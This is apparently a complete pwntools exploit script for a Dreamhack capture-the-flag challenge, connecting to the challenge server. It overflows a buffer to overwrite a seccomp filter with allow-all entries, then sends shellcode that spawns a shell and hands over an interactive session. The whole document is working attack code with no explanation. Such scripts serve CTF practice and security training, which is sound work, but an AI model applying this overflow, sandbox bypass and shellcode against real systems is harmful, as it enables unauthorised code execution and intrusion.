from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 8361
r = remote(HOST, PORT)

filter = p16(0x6) + p8(0) + p8(0) + p32(0x7fff0000)
payload = (b'A'*128 + filter*3).ljust(256, b'\x00') + p64(2)

r.sendlineafter(b'? ', b'bof')
r.sendlineafter(b': ', payload)

r.sendlineafter(b'? ', b'shellcode')
r.sendlineafter(b': ', asm(shellcraft.sh()))

r.interactive()